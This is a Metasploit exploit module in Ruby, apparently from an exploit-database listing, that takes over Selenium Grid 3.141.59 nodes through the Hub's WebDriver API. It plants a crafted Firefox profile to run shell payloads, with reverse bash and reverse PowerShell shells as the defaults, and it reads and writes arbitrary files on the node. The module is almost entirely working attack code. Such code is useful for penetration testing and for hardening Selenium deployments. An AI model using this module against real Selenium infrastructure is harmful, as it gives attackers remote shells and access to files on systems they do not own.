# Exploit Title: Selenium Node Takeover Kit
# Date: 11/??/2021
# Exploit Author: Jon Statton
# Vendor Homepage: https://www.selenium.dev/
# Software Link: https://selenium-release.storage.googleapis.com/3.141/selenium-server-standalone-3.141.59.jar
# Version: 3.141.59
# Tested on: 3.141.59 + Firefox(geckodriver)

# I think the download and upload of files on a Selenium Node should be turned off by default on the Hub level. It should be something that has to be turned on explicitly, maybe with some type of authorization.

# DESCRIPTION: Basically a minimal version of Selenium Node Download. Rather than try build an inline HTML form, this just loads the file like “file:///tmp/blah.txt” and dumps the loaded page. This is useful for like small text files, and just for testing interaction with the file-system on a Selenium Node.

# INSTALL: To install, copy this to "~/.msf4/modules/exploits/multi/http/" or whatever.

# RUN: Set "URL" to the HUB URL (Should look like http://selenium-hub.lan:4444/wd/hub). Set "COMMAND_TYPE" to upload, download, or command. The set the other arguments as needed.

require 'json'
require 'zip'
require 'base64'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Selenium Node Takeover Kit',
      'Description'    => %q{
        Use the browser(Firefox) on a Selenium Node to cat a file.
        Basically it uses the browser to load a text file into the browser
        then it dumps the page text.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Jon Stratton' ],
      'References'     =>
        [
          [ 'URL', 'https://github.com/JonStratton/selenium-node-takeover-kit' ]
        ],
      'Platform'      => ['unix', 'linux', 'macos', 'win'],
      'Arch'          => ARCH_ALL,
      'Targets'       => [
        [
          'Unix', {
            'Platform' => 'unix',
            'Arch'     => ARCH_CMD,
            'Type'     => :unix_cmd,
            'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' }
          }
        ],
        [
          'Windows', {
            'Platform' => 'win',
            'Arch'     => ARCH_CMD,
            'Type'     => :win_cmd,
            'DefaultOptions' => { 'PAYLOAD' => 'cmd/windows/reverse_powershell' }
          }
        ]
      ],
      'DefaultTarget' => 0,
      'DisclosureDate' => "Oct ?? 2020"))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The Selenium Hub URL.', '/wd/hub']),
        OptString.new('REMOTE_FILE', [false, 'The remote file be uploaded to, downloaded from, or catted.']),
        OptString.new('LOCAL_FILE', [false, 'The local file to be uploaded or downloaded too.']),
        OptString.new('BROWSER', [false, 'The BrowserName to use.', 'firefox']),
        OptString.new('COMMAND_TYPE', [false, 'upload/download/command', 'command'])
      ])
  end

  def check_options
    remote_file = datastore['REMOTE_FILE']
    local_file = datastore['LOCAL_FILE']
    browser = datastore['BROWSER']
    command_type = datastore['COMMAND_TYPE']

    unless ['upload', 'download', 'command'].include? command_type
      fail_with(Failure::BadConfig, 'COMMAND_TYPE must be upload, download, or command')
    end

    if ['upload', 'command'].include? command_type and browser != 'firefox'
      fail_with(Failure::BadConfig, 'upload and command only (currently) work with firefox')
    end

    if command_type == 'upload' and (remote_file.empty? or local_file.empty?)
      fail_with(Failure::BadConfig, 'To use upload, you must set REMOTE_FILE and LOCAL_FILE')
    end

    if command_type == 'download' and remote_file.empty?
      fail_with(Failure::BadConfig, 'To use download, you must set REMOTE_FILE')
    end
  end

  def exploit
    check_options

    sessionId = start_session

    case datastore['COMMAND_TYPE']
    when 'command'
      rce_firefox sessionId
    when 'download'
      download sessionId
    when 'upload'
      upload_firefox sessionId
    end

    #end_session sessionId
  end

  # Creates a selenium session. If uploading or running command, a custom profile is created to use the advanced features.
  def start_session
    browser = datastore['BROWSER']
    command_type = datastore['COMMAND_TYPE']
    remote_file = datastore['REMOTE_FILE']

    desiredCapabilities = JSON.generate({:desiredCapabilities => {:browserName => browser}})

    # If upload or command, build a firefox profile (which is a zip file)
    if ['upload', 'command'].include? command_type
      # Build profile zip file.
      stringio = Zip::OutputStream::write_buffer do |io|

        if command_type == 'command' # Create a handler for shell scripts
          shell_runner = "/bin/sh"
          case target['Type']
          when :win_cmd
            shell_runner = "C:\\\\Windows\\\\System32\\\\cmd.exe"
          end

          io.put_next_entry("handlers.json")
          io.write('{"defaultHandlersVersion":{"en-US":4},"mimeTypes":{"application/sh":{"action":2,"handlers":[{"name":"sh","path":"%s"}]}}}' % [shell_runner])

        elsif command_type == 'upload' # Allows us to download files without being prompted.
          remote_dir = File::dirname(remote_file)
          case target['Type']
          when :win_cmd
            remote_dir = File::dirname(remote_file.gsub('\\', '/')).gsub('/', "\\\\\\") # Double escaped so it will be escaped in the config file.
          end
          io.put_next_entry("prefs.js")
          io.write('user_pref("browser.download.dir", "%s");
user_pref("browser.download.folderList", 2);
user_pref("browser.helperApps.neverAsk.saveToDisk", "application/octet-stream;");' % [remote_dir])
        end

      end
      stringio.rewind
      encoded_profile = Base64.strict_encode64(stringio.sysread)
      desiredCapabilities = JSON.generate({:desiredCapabilities => {:browserName => browser, :firefox_profile => encoded_profile}})
    end

    # Start session. driver = Selenium::WebDriver.for :remote, :url => url, :desired_capabilities => { :browserName => browser }
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => desiredCapabilities
    })
    sessionId = res.get_json_document["value"]["sessionId"] ? res.get_json_document["value"]["sessionId"] : res.get_json_document["sessionId"]

    unless sessionId
      fail_with(Failure::NotFound, "Failed to start session.")
    end
    print_good("Created Session: #{sessionId}")

    return sessionId
  end

  # Ends the Selenium session. Nil timeout seems to close this session more consistently.
  def end_session (sessionId)
    res = send_request_cgi({
      'method' => 'DELETE',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId)
    }, nil)
  end

  # Uses a custom Firefox profile to create an "application/sh" handler. Then the payload is encoded into a base64 inline URL. 
  def rce_firefox (sessionId)
    shell_command = "bash -c \"#{payload.encoded}\" >/dev/null 2>&1"
    case target['Type']
    when :win_cmd
      shell_command = payload.encoded
    end
    print(shell_command)

    data_url = "data:application/sh;charset=utf-16le;base64,%s" % [Base64.encode64(shell_command)]

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId, 'url'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => JSON.generate({:url => data_url})
    }, nil)
  end

  # Creates an inline html page with a file upload feature. When a file is uploaded, js reads it and stores it in a var("inf"). This is then returned back to this script with "return(inf)".
  def download (sessionId)
    remote_file = datastore['REMOTE_FILE']
    local_file = datastore['LOCAL_FILE']

    #driver.get(...)
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId, 'url'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => JSON.generate({:url => 'data:text/html;charset=utf-8,<html><input id=f type=file onchange="rf(event)"><script>var inf; var rf = function(e) { var inp = e.target; var read = new FileReader(); read.onload = function(){inf = read.result;}; read.readAsDataURL(inp.files[0]);}</script></html>'})
    })

    #driver.find_element(id: 'f').send_keys(remote_file_base)
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId, 'element'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => JSON.generate({:using => 'css selector', :value => '#f'})
    })
    elementId = res.get_json_document["value"].values[0]

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId, 'element', elementId, 'value'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => JSON.generate({:text => remote_file, :value => remote_file.split()})
    })

    # js_return = driver.execute_script('return(inf)')   # Dump the contents of "inf"
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId, 'execute', 'sync'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => JSON.generate({:args => [], :script => "return(inf)"})
    })
    decoded_contents = Base64.decode64(res.get_json_document["value"].split(',')[1])

    if local_file
      File.open(local_file, 'wb') do |f|
        f.write(decoded_contents)
      end
    else
      print(decoded_contents)
    end
  end

  # Uses a custom Firefox profile to set the remote save directory and turn off the "Save as" prompt. Basically, the file we want to upload is embedded inline into another inline page. Then this link is clicked
  def upload_firefox (sessionId)
    remote_file = datastore['REMOTE_FILE']
    local_file = datastore['LOCAL_FILE']

    remote_file_base = File::basename(remote_file)
    case target['Type']
    when :win_cmd
      remote_file_base = File::basename(remote_file.gsub('\\', '/')).gsub('/', '\\')
    end

    href = 'data:application/octet-stream;charset=utf-16le;base64,%s' % [Base64.encode64( File.read(local_file) )]
    data_url = 'data:text/html;charset=utf-8,<html><a id=f href="%s" download="%s">f</a></html>' % [href, remote_file_base]

    # URL.
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId, 'url'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => JSON.generate({:url => data_url})
    })

    # Element.
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId, 'element'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => JSON.generate({:using => 'css selector', :value => '#f'})
    })
    elementId = res.get_json_document["value"].values[0]

    # Element Click.
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId, 'element', elementId, 'click'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => JSON.generate({})
    })
  end
end
